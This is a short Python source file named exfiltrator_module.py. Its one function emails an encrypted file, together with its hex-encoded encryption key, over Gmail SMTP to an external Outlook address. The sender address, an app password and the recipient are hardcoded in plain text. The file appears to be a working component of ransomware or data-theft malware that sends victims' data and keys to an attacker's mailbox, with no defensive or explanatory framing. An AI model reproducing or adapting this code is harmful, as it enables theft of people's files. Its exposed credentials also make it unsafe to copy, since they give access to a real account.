# exfiltrator_module.py
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base      import MIMEBase
from email                  import encoders
import os

EMAIL_ADDRESS  = "ahmedmoamen2200@gmail.com"
EMAIL_PASSWORD = "jkza qrun caur wpxw"
EMAIL_TARGET   = "recipienfk61@outlook.com"
SMTP_SERVER    = "smtp.gmail.com"
SMTP_PORT      = 587

def send_exfiltration(subject: str, file_path: str, key: bytes):
    """Attach the encrypted file and the hex‐encoded key, send via SMTP."""
    msg = MIMEMultipart()
    msg['From']    = EMAIL_ADDRESS
    msg['To']      = EMAIL_TARGET
    msg['Subject'] = subject

    # attach encrypted file
    with open(file_path, 'rb') as f:
        part = MIMEBase('application','octet-stream')
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(file_path)}"')
        msg.attach(part)

    # attach key
    key_part = MIMEBase('application','octet-stream')
    key_hex  = key.hex().encode()
    key_part.set_payload(key_hex)
    encoders.encode_base64(key_part)
    key_part.add_header('Content-Disposition', 'attachment; filename="key.txt"')
    msg.attach(key_part)

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as srv:
        srv.starttls()
        srv.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        srv.send_message(msg)

    print("✅ Encrypted archive and key sent via email.")
